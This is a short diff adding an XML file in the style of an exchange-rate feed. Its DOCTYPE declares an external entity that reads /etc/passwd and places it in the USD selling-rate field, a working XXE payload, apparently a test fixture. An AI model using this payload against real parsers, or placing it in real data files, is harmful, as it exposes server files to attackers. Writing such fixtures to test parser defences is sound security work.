@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Tarih_Date [<!ENTITY rate SYSTEM "file:///etc/passwd">]>
+<Tarih_Date Tarih="24.11.2026"><Currency CurrencyCode="USD"><Unit>1</Unit><ForexSelling>&rate;</ForexSelling></Currency></Tarih_Date>
